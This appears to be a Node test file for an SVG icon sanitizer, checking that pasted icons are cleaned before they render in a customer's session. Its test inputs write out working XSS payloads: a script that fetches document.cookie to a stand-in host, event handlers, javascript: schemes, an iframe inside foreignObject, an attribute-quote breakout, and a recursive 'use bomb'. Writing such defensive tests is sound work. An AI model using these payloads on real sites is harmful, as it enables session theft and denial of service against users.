import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import {
  InvalidIconError,
  sanitizeIconMarkup,
} from '../src/modules/subpage-config/connect-page/svg-sanitizer.util';

/**
 * The one thing standing between an operator's paste and a customer's browser.
 *
 * The workflow is "open tabler.io, press Copy SVG, paste" — which is a good
 * workflow and the reason this file cannot simply refuse markup. But an icon
 * authored in the panel is rendered as HTML in the cabinet, in a signed-in
 * customer's session, and SVG in that position is not a picture format: it is a
 * document format that can carry scripts, event handlers, embedded HTML and
 * outward references.
 *
 * Every test below is a paste that parses, looks like an icon, and is not one.
 */

const ICON =
  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14"/><circle cx="12" cy="12" r="9"/></svg>';

describe('an ordinary icon survives', () => {
  it('keeps the drawing and the attributes it is drawn with', () => {
    const { markup, removed } = sanitizeIconMarkup(ICON);

    assert.match(markup, /^<svg /);
    assert.match(markup, /viewBox="0 0 24 24"/);
    assert.match(markup, /<path d="M5 12h14"\/>/);
    assert.match(markup, /<circle cx="12" cy="12" r="9"\/>/);
    assert.deepEqual(removed, []);
  });

  it('drops the referencing machinery, which was inert and dangerous at once', () => {
    // `use`, `defs`, gradients, `clipPath` and `mask` used to be allowed. Every
    // one of them is reachable only through `url(#…)` or an href fragment, and
    // `url(` is stripped unconditionally — so they drew nothing. Meanwhile ten
    // nested groups referencing each other through `use` fit in under 2 KB,
    // pass every ceiling in the file, and expand to ten billion nodes in the
    // customer's browser.
    const { markup } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs><use href="#g"/><path d="M0 0"/></svg>',
    );

    assert.doesNotMatch(markup, /use|linearGradient|defs/i);
    assert.match(markup, /<path d="M0 0"\/>/, 'the drawing still survives');
  });

  it('refuses a use bomb outright', () => {
    const bomb = `<svg viewBox="0 0 1 1">${Array.from(
      { length: 10 },
      (_, i) => `<g id="l${i}">${'<use href="#l' + (i - 1) + '"/>'.repeat(10)}</g>`,
    ).join('')}<path d="M0 0"/></svg>`;

    const { markup } = sanitizeIconMarkup(bomb);

    assert.doesNotMatch(markup, /<use/i);
  });

  it('strips id and class, which are written into a page this markup does not own', () => {
    // `fixed inset-0 z-50` are real utilities in the cabinet's stylesheet: the
    // icon would lift out of the flow and cover the screen. An id collides with
    // the page's own — including with the same icon drawn twice.
    const { markup, removed } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24" class="fixed inset-0 z-50" id="app"><path d="M0 0" id="p"/></svg>',
    );

    assert.doesNotMatch(markup, /class=|id=/);
    assert.ok(removed.includes('@class') && removed.includes('@id'));
  });

  it('escapes a quote so a single-quoted value cannot break out', () => {
    // The rebuilt output always double-quotes. A value that arrived in single
    // quotes may legally contain `"`, and without escaping it would close the
    // attribute and open a live `onload` — the one guard in the file that
    // nothing else backs up.
    const { markup } = sanitizeIconMarkup(
      `<svg viewBox="0 0 1 1"><path d='M0 0" onload="alert(1)'/></svg>`,
    );

    assert.doesNotMatch(markup, /onload="alert/);
    assert.match(markup, /&quot;/);
  });

  it('does not spend a second of CPU on an icon full of ampersands', () => {
    // The entity test used to scan the whole remaining string for every `&`.
    // At the schema's own 32 KB ceiling that was half a second per icon, and
    // two hundred icons in one request is a minute and a half of blocked event
    // loop — on the endpoint that only validates and writes nothing.
    const dense = `<svg viewBox="0 0 1 1"><path d="M0 0"/><title>${'&'.repeat(30_000)}</title></svg>`;

    const started = Date.now();
    sanitizeIconMarkup(dense);

    assert.ok(Date.now() - started < 250, 'escaping text must be linear in its length');
  });
});

describe('what an icon is not allowed to be', () => {
  it('drops a script together with everything inside it', () => {
    // Dropping the tag but keeping its children is the classic half-fix: the
    // body of the script comes back as visible text at best, and as markup the
    // next consumer re-parses at worst.
    const { markup, removed } = sanitizeIconMarkup(
      `<svg viewBox="0 0 24 24"><script>fetch("//evil.test?c="+document.cookie)</script><path d="M0 0"/></svg>`,
    );

    assert.doesNotMatch(markup, /fetch/);
    assert.doesNotMatch(markup, /script/i);
    assert.match(markup, /<path d="M0 0"\/>/, 'the actual drawing must survive');
    assert.ok(removed.includes('<script>'));
  });

  it('drops an event handler while keeping the element it sat on', () => {
    const { markup, removed } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><path d="M0 0" onload="alert(1)" onclick="alert(2)"/></svg>',
    );

    assert.doesNotMatch(markup, /onload|onclick|alert/i);
    assert.match(markup, /<path d="M0 0"\/>/);
    assert.ok(removed.includes('event handler'));
  });

  it('drops foreignObject, which is arbitrary HTML wearing an icon costume', () => {
    const { markup } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><foreignObject><iframe src="//evil.test"></iframe></foreignObject><path d="M0 0"/></svg>',
    );

    assert.doesNotMatch(markup, /foreignObject|iframe|evil/i);
    assert.match(markup, /<path/);
  });

  it('refuses a reference that leaves the document', () => {
    // Nothing may reach outward, whether by scheme or by protocol-relative
    // address. The element carrying it is dropped whole now, which is stricter
    // than stripping the attribute and leaving the shell.
    const { markup } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><use href="//evil.test/x.svg#a"/><path d="M0 0"/></svg>',
    );

    assert.doesNotMatch(markup, /evil\.test|<use/i);
    assert.match(markup, /<path/);
  });

  it('refuses a scheme hidden in an ordinary attribute', () => {
    const { markup } = sanitizeIconMarkup(
      `<svg viewBox="0 0 24 24"><path d="M0 0" fill="url(#x)" clip-path="javascript:alert(1)"/></svg>`,
    );

    assert.doesNotMatch(markup, /javascript|url\(/i);
    assert.match(markup, /<path d="M0 0"\/>/);
  });

  it('drops style, a second language inside an attribute', () => {
    const { markup, removed } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><path d="M0 0" style="background:url(//evil.test)"/></svg>',
    );

    assert.doesNotMatch(markup, /style|evil/i);
    assert.ok(removed.includes('@style'));
  });

  it('drops a comment rather than parsing what is inside it', () => {
    const { markup } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><!-- <script>alert(1)</script> --><path d="M0 0"/></svg>',
    );

    assert.doesNotMatch(markup, /script|alert/i);
  });

  it('refuses a bare "<" in text rather than deciding what it meant', () => {
    // `a < b` inside an element is not valid markup, and there are two readings:
    // text, or a malformed tag. Escaping it would be this module choosing one —
    // and a sanitizer that chooses differently from the renderer downstream is
    // the whole vulnerability. It refuses instead.
    assert.throws(
      () => sanitizeIconMarkup('<svg viewBox="0 0 24 24"><title>a < b</title><path d="M0 0"/></svg>'),
      InvalidIconError,
    );
  });

  it('escapes a ">" in text, which is legal and unambiguous', () => {
    const { markup } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><title>a > b</title><path d="M0 0"/></svg>',
    );

    assert.match(markup, /a &gt; b/);
  });

  it('does not re-escape text that was already escaped', () => {
    // Escaping `&` unconditionally turns a correctly written `&lt;` into a
    // visible `&lt;` — the icon is safe and the title is mangled.
    const { markup } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><title>a &lt; b &amp; c</title><path d="M0 0"/></svg>',
    );

    assert.match(markup, /<title>a &lt; b &amp; c<\/title>/);
  });
});

describe('what it refuses outright', () => {
  it('refuses anything that is not an svg to begin with', () => {
    for (const input of ['', '   ', '<div>hi</div>', 'not markup at all', '<img src=x onerror=alert(1)>']) {
      assert.throws(() => sanitizeIconMarkup(input), InvalidIconError, `"${input}" should be refused`);
    }
  });

  it('refuses markup it cannot read rather than guessing', () => {
    // Guessing is how a sanitizer and a renderer come to disagree about what a
    // string means, and that disagreement IS the vulnerability.
    assert.throws(() => sanitizeIconMarkup('<svg viewBox="0 0 1 1"><path d="M0 0"'), InvalidIconError);
    assert.throws(() => sanitizeIconMarkup('<svg viewBox="0 0 1 1"><g><path/></svg>'), InvalidIconError);
    assert.throws(() => sanitizeIconMarkup('<svg viewBox="0 0 1 1"><!-- open'), InvalidIconError);
  });

  it('refuses something too big to be an icon', () => {
    const huge = `<svg viewBox="0 0 1 1">${'<path d="M0 0"/>'.repeat(5_000)}</svg>`;

    assert.throws(() => sanitizeIconMarkup(huge), InvalidIconError);
  });

  it('refuses when cleaning left nothing to draw', () => {
    // `<svg></svg>` passes every structural check and draws a blank square. In
    // the library that is indistinguishable from a styling problem, so the
    // refusal has to happen while the paste is still on screen.
    assert.throws(
      () => sanitizeIconMarkup('<svg viewBox="0 0 24 24"><script>alert(1)</script></svg>'),
      /nothing was left to draw/i,
    );
  });

  it('does not choke on a tag whose attribute value contains a bracket', () => {
    // `>` inside a quoted value is legal and a naive scanner ends the tag early,
    // which silently truncates the icon instead of refusing it.
    const { markup } = sanitizeIconMarkup('<svg viewBox="0 0 24 24"><title>a > b</title><path d="M0 0"/></svg>');

    assert.match(markup, /<path d="M0 0"\/>/);
  });
});
